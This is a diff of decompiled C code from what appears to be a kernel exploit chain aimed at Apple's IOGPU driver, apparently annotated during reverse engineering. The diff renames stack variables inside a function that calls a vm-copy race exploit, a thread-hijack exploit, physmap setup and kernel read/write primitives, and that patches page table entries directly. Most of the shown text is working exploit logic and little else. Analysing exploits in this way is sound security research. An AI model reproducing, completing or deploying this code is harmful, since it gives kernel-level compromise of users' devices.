@@ -5766,9 +5766,7 @@ __int64 __fastcall iogpu_kernel_read_op(__int64 krwCtx, unsigned __int64 a2, int
   uint64_t v28[2]; // [xsp+58h] [xbp-358h] BYREF
   int v29; // [xsp+68h] [xbp-348h]
   uint64_t *v30[3]; // [xsp+70h] [xbp-340h] BYREF
-  uint64_t v31[3]; // [xsp+88h] [xbp-328h] BYREF
-  __int64 v32; // [xsp+A0h] [xbp-310h]
-  __int64 v33; // [xsp+A8h] [xbp-308h]
+  uint64_t kernelScanCtx[5]; // [xsp+88h] [xbp-328h] BYREF
   uint64_t v34[2]; // [xsp+B0h] [xbp-300h] BYREF
   char v35; // [xsp+C4h] [xbp-2ECh]
   unsigned __int64 v36; // [xsp+D0h] [xbp-2E0h]
@@ -5791,24 +5789,24 @@ __int64 __fastcall iogpu_kernel_read_op(__int64 krwCtx, unsigned __int64 a2, int
           goto LABEL_6;
       }
     }
-    v30[2] = v31;
+    v30[2] = kernelScanCtx;
     v34[0] = off_448E0;
-    v34[1] = v31;
+    v34[1] = kernelScanCtx;
     v12 = parse_xnu_version_string((__int64)&qword_480D8);
     if ( !v12 )
     {
       v7 = 163878;
-      v33 = krwCtx;
-      scan_for_macho_header(v31, *(uint64_t *)(krwCtx + 6600));
+      kernelScanCtx[4] = krwCtx;
+      scan_for_macho_header(kernelScanCtx, *(uint64_t *)(krwCtx + 6600));
       port_kaddr = get_task_kobject_addr((struct_krwCtx *)krwCtx, mach_task_self_);
-      v31[2] = port_kaddr;
-      if ( port_kaddr && (v32 = kreadptr((struct_krwCtx *)krwCtx, port_kaddr)) != 0 )
+      kernelScanCtx[2] = port_kaddr;
+      if ( port_kaddr && (kernelScanCtx[3] = kreadptr((struct_krwCtx *)krwCtx, port_kaddr)) != 0 )
       {
         if ( !(unsigned int)init_text_exec_data_const_sections(v30) && !(unsigned int)setup_iokit_notify_dispatch(&qword_48000, v30) )
         {
           if ( (unsigned int)exploit_thread_vmcopy_race((__int64)v34)
-            || (unsigned int)krw_ctx_setup_physmap((__int64)&word_48048, v30, (__int64)v31)
-            || (v28[0] = v31, v28[1] = v34, v29 = 0, (unsigned int)thread_hijack_exploit((__int64)v28)) )
+            || (unsigned int)krw_ctx_setup_physmap((__int64)&word_48048, v30, (__int64)kernelScanCtx)
+            || (v28[0] = kernelScanCtx, v28[1] = v34, v29 = 0, (unsigned int)thread_hijack_exploit((__int64)v28)) )
           {
             get_ppnum_via_kread((__int64)v34);
           }
@@ -5840,8 +5838,8 @@ __int64 __fastcall iogpu_kernel_read_op(__int64 krwCtx, unsigned __int64 a2, int
             if ( v23 && (v36 & 0xFFFFFFFFC000LL) != 0 )
             {
               v30[0] = (uint64_t *)MEMORY[0x400000008];
-              v31[0] = MEMORY[0x400000008] & 0xFFFF000000003FFFLL | v36 & 0xFFFFFFFFC000LL;
-              MEMORY[0x400000008] = v31[0];
+              kernelScanCtx[0] = MEMORY[0x400000008] & 0xFFFF000000003FFFLL | v36 & 0xFFFFFFFFC000LL;
+              MEMORY[0x400000008] = kernelScanCtx[0];
               memory_barrier_dsb_isb();
               semaphore_timedwait_ns(krwCtx, 0x2710u);
               *(uint64_t *)(v22 & 0x3FFF | 0x400004000LL) = v21 & 0xFFFF000000003FFFLL
@@ -5860,10 +5858,10 @@ LABEL_6:
                 if ( v35 == 3 )
                 {
                   v11 = v9 + 8 * (((*(uint32_t *)(krwCtx + 384) + (uint32_t)v9) & 0x1FFFFFFu) / *(uint32_t *)(krwCtx + 384));
-                  if ( (unsigned int)krw_read_thunk((struct_krwCtx *)krwCtx, v11, 8, v31) )
+                  if ( (unsigned int)krw_read_thunk((struct_krwCtx *)krwCtx, v11, 8, kernelScanCtx) )
                   {
-                    v27[0] = v31[0] & 0xFFFF000000003FFFLL | (((v36 >> 14) & 0x3FFFFFFFFLL) << 14);
-                    if ( v27[0] == v31[0] )
+                    v27[0] = kernelScanCtx[0] & 0xFFFF000000003FFFLL | (((v36 >> 14) & 0x3FFFFFFFFLL) << 14);
+                    if ( v27[0] == kernelScanCtx[0] )
                       goto LABEL_12;
                     if ( (unsigned int)kwrite_with_retry(krwCtx, v11, (__int64)v27, 8) )
                     {
